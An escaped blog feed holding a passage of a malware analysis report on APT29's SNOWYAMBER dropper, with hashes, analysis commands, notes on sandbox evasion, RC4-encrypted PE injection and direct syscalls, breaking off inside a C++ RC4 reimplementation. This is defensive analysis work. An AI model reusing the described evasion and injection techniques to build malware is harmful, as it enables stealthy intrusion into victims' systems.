&lt;a href=&quot;https://github.com/kokke/tiny-ECDH-c&quot;&gt;https://github.com/kokke/tiny-ECDH-c&lt;/a&gt;   &lt;br /&gt;
&lt;a href=&quot;https://en.wikipedia.org/wiki/Salsa20&quot;&gt;Salsa20 wikipedia&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://en.wikipedia.org/wiki/Peter_Montgomery_(mathematician)&quot;&gt;Peter Montgomery&lt;/a&gt;    &lt;br /&gt;
&lt;a href=&quot;https://app.any.run/tasks/2eaffd86-79a7-4752-835b-b7815f9cd44b/&quot;&gt;Babuk sample&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Thanks for your time happy hacking and good bye!       &lt;br /&gt;
&lt;em&gt;All drawings and screenshots are MSSPLab’s&lt;/em&gt;&lt;/p&gt;</content><author><name>MSSP Lab</name></author><category term="threat-hunting" /><category term="blueteam" /><category term="malware" /><category term="malwareanalysis" /><summary type="html">Babuk is a ransomware family that was first discovered in early 2021. It quickly became infamous, especially among corporate networks, for its ability to quickly encrypt files and demand ransom. However, the decisive moment in its development was the leak of the source code, which subsequently contributed to the spread of new ransomware variants.</summary></entry><entry><title type="html">Malware analysis report: SNOWYAMBER (+APT29 related malwares)</title><link href="http://localhost:4001/threat-hunting/2023/06/02/malware-analysis-apt29.html" rel="alternate" type="text/html" title="Malware analysis report: SNOWYAMBER (+APT29 related malwares)" /><published>2023-06-02T05:00:00+03:00</published><updated>2023-06-02T05:00:00+03:00</updated><id>http://localhost:4001/threat-hunting/2023/06/02/malware-analysis-apt29</id><content type="html" xml:base="http://localhost:4001/threat-hunting/2023/06/02/malware-analysis-apt29.html">&lt;p&gt;This report provides a comprehensive analysis of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SNOWYAMBER&lt;/code&gt; dropper, and it’s modifications, a sophisticated piece of malware attributed to the Advanced Persistent Threat group &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APT29&lt;/code&gt;. The group is believed to be tied to the Russian government and has been linked to numerous cyber espionage operations.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/APT29.png&quot; alt=&quot;apt29&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;threat-actor&quot;&gt;Threat actor&lt;/h3&gt;

&lt;p&gt;&lt;strong&gt;APT29&lt;/strong&gt;, also known as The Dukes or Cozy Bear, is a highly sophisticated and well-resourced cyber espionage group believed to be associated with the Russian government. It has been operating since at least 2008.&lt;/p&gt;

&lt;h3 id=&quot;target&quot;&gt;Target&lt;/h3&gt;

&lt;p&gt;While the group’s exact location is unknown, multiple cybersecurity research groups and government agencies attribute &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APT29&lt;/code&gt; to Russia. Their targets are typically spread across the globe, with a specific focus on government organizations, think-tanks, healthcare organizations, and energy sectors.&lt;/p&gt;

&lt;h3 id=&quot;ttps&quot;&gt;TTPs&lt;/h3&gt;

&lt;p&gt;&lt;em&gt;APT29&lt;/em&gt; is known for its persistent and evolving tactics, which include a combination of advanced techniques and procedures:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Spear-Phishing:&lt;/em&gt; APT29 commonly utilizes spear-phishing campaigns for initial compromise. These usually involve emails with either a malicious attachment or a link to a malicious website. Their spear-phishing attacks often involve the use of legitimate web services, such as Google accounts, to host their payload and seem less suspicious.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Use of Zero-days and Exploits:&lt;/em&gt; The group is known to use zero-day exploits as well as known vulnerabilities to infiltrate networks. They were known to exploit vulnerabilities such as &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2017-11292&lt;/code&gt; (Adobe Flash), &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2017-8759&lt;/code&gt; (.NET Framework), and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CVE-2017-0199&lt;/code&gt; (Microsoft Office/WordPad).&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Living-off-the-Land Tactics:&lt;/em&gt; &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;APT29&lt;/code&gt; frequently employs “living-off-the-land” tactics, where they use legitimate system tools and processes to hide their activities and maintain persistence. For instance, they have been known to use PowerShell for scripting, WMI for persistence, and PsExec for lateral movement.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Custom Malware:&lt;/em&gt; The group uses a variety of custom backdoors and droppers, including but not limited to MiniDuke, CosmicDuke, OnionDuke, and CozyDuke. More recently, they have been associated with the WellMess and WellMail malware.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Stealth and Long-term Persistence:&lt;/em&gt; APT29 is known for its stealthy operations and ability to maintain a long-term presence on infiltrated networks without detection. They often do so by limiting their activities during the working hours of the target’s local time zone to mimic legitimate users and avoid raising alerts.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;&lt;em&gt;Data Exfiltration:&lt;/em&gt; APT29 is known for extracting sensitive information from the infiltrated networks. They often do this very slowly and cautiously to avoid detection. The group is believed to be interested in gathering intelligence related to foreign policy, defense, international relations, and similar topics.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;malware-features&quot;&gt;Malware features&lt;/h3&gt;

&lt;p&gt;Through our analysis, we have identified the following notable features of the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SNOWYAMBER&lt;/code&gt; dropper:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Infection capabilities:&lt;/em&gt; The malware is typically introduced to the victim’s machine via spear phishing, hiding in documents that prompt the user to enable macros. (High Confidence)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Capacity for self-preservation:&lt;/em&gt; The malware employs anti-analysis and persistence mechanisms, which include obfuscation techniques, disabling security tools, and creating Registry keys to survive reboots. (High Confidence)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Diffusion mechanism:&lt;/em&gt; The dropper, upon execution, deploys additional payloads on the infected machine, and may also propagate laterally within the network. (Medium Confidence)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Data exfiltration capabilities:&lt;/em&gt; The malware appears capable of collecting system information and sending it to a Command and Control (C2) server. (High Confidence)&lt;/p&gt;

&lt;p&gt;&lt;em&gt;C2 mechanisms:&lt;/em&gt; The malware uses encrypted HTTP requests for C2 communication. (High Confidence)&lt;/p&gt;

&lt;h3 id=&quot;identification&quot;&gt;Identification&lt;/h3&gt;

&lt;p&gt;Among the malware samples analysed, the most interesting are following.&lt;/p&gt;

&lt;p&gt;Four samples are being investigated:&lt;/p&gt;

&lt;p&gt;&lt;em&gt;sample.exe&lt;/em&gt; - this file is worked for injection:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;205824 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;109f05770bf8550f71b39ceaffc6e42e&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;72b57b47649f145ba341420fa0a4624810c011d9&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;First of all, check our sample via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc/detection&quot;&gt;https://www.virustotal.com/gui/file/287543c235cf68695373d367144c51a0236879e614e8ea4634b82e5336785edc/detection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_13-21.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So, 2 of 70 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This sample is written in C++ and uses multiple malware development tricks: WinAPI functions call by hash, string obfuscation and encryption, time distortion.&lt;/p&gt;

&lt;h3 id=&quot;static-analysis&quot;&gt;Static analysis&lt;/h3&gt;

&lt;p&gt;The specified sample is a PE file:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;file &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_17-23.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hexdump &lt;span class=&quot;nt&quot;&gt;-C&lt;/span&gt; &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_17-25.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;exiftool&lt;/code&gt; for looking metadata:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_17-26.png&quot; alt=&quot;file&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And we see that file timestamp is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;2023-02-25 22:07:22+03.00&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Executable sample is not packed by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;upx&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;upx &lt;span class=&quot;nt&quot;&gt;-l&lt;/span&gt; &amp;lt;sample.exe&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_17-28.png&quot; alt=&quot;upx&quot; /&gt;&lt;/p&gt;

&lt;p&gt;What about Shannon entropy of the sample:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_17-30.png&quot; alt=&quot;shannon&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Analysze with DIE says that the compiler is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Microsoft Visual Studio 2019&lt;/code&gt;:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_18-26.png&quot; alt=&quot;die&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;dynamic-analysis&quot;&gt;dynamic analysis&lt;/h3&gt;

&lt;p&gt;Contacted IP addresses is:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_18-37.png&quot; alt=&quot;dynamic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;The main logic starts with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;int start&lt;/code&gt; function.&lt;/p&gt;

&lt;p&gt;Then arbitrary computations are performed: this is a popular sandbox bypass trick. And run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;switch&lt;/code&gt; logic:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_01-59.png&quot; alt=&quot;dynamic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_16-30.png&quot; alt=&quot;dynamic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Also use WinAPI functions:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateTimerQueue&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateTimerQueueTimer&lt;/code&gt;&lt;/li&gt;
  &lt;li&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;DeleteTimerQueueEx&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_17-06.png&quot; alt=&quot;dynamic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_17-16.png&quot; alt=&quot;dynamic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Here use an event object to track the TimeRoutine execution, create the timer queue, then set a timer to call the timer routine in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;10&lt;/code&gt; seconds.&lt;/p&gt;

&lt;p&gt;This implementation sets up asynchronous timers using &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CreateTimerQueueTimer&lt;/code&gt;. Each executes one after the other and does the following tasks: Wait a specific time period.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_02-03.png&quot; alt=&quot;dynamic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;When executed, the injector reads the resource, decrypts it by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RC4&lt;/code&gt; algorithm, allocates memory, copies sections, processes relocks, and transfers control to the entry point.&lt;/p&gt;

&lt;p&gt;What about injection technique. It’s PE injection.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_01-51.png&quot; alt=&quot;dynamic&quot; /&gt;&lt;/p&gt;

&lt;p&gt;All NT API functions are replaced by calling equivalent syscalls from &lt;a href=&quot;https://github.com/klezVirus/SysWhispers3&quot;&gt;https://github.com/klezVirus/SysWhispers3&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;sample2.exe&lt;/em&gt; - this sample is an encryptor:&lt;/p&gt;

&lt;p&gt;File size: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;214528 bytes&lt;/code&gt;  &lt;br /&gt;
MD5 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;107dae5b9c61c962e0d604cd70a1d8ae&lt;/code&gt;   &lt;br /&gt;
SHA-1 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;3752be6b162bacb0d7c12b6d122c9dbaf3ad6223&lt;/code&gt;  &lt;br /&gt;
SHA-256 sum: &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;a89150f159c1c9d053365ac38625f783642bc4c16a693cb106d715819acc677b&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Check it via VirusTotal:&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://www.virustotal.com/gui/file/a89150f159c1c9d053365ac38625f783642bc4c16a693cb106d715819acc677b/detection&quot;&gt;https://www.virustotal.com/gui/file/a89150f159c1c9d053365ac38625f783642bc4c16a693cb106d715819acc677b/detection&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-02_15-53.png&quot; alt=&quot;vt&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;So, 2 of 70 AV engines detect our sample as malicious.&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;This encryptor encrypts the payload with the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RC4&lt;/code&gt; algorithm, then the result is attached to the injector with the resource.&lt;/p&gt;

&lt;p&gt;Encryptor use 2 params: Input file and output file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_01-17.png&quot; alt=&quot;enc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_02-56.png&quot; alt=&quot;enc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Classic &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RC4&lt;/code&gt; algorithm:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/4/2023-06-03_03-01.png&quot; alt=&quot;enc&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There is a simple reimplementation this logic:&lt;/p&gt;

&lt;div class=&quot;language-cpp highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;VOID&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;rc4crypt&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PBYTE&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;PCSTR&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UINT&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HeapAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessHeap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;HeapAlloc&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;GetProcessHeap&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(),&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;unsigned&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// to be used in swaping&lt;/span&gt;
  &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;t&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* S &amp;amp; K initialization */&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;key&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;keyLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

  &lt;span class=&quot;cm&quot;&gt;/* State Permutation */&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;T&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;c1&quot;&gt;//Swap S[i] &amp;amp; S[j]&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;j&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;];&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;S&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;tmp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
  &lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
  &lt;span class=&quot;n&quot;&gt;j&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// reintializing j to reuse it&lt;/span&gt;
  &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;dataLen&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;x&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;256&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt; &lt;span class=&quot;c1&quot;&gt;// using %256 to avoid exceed the array limit&lt;/span&gt;
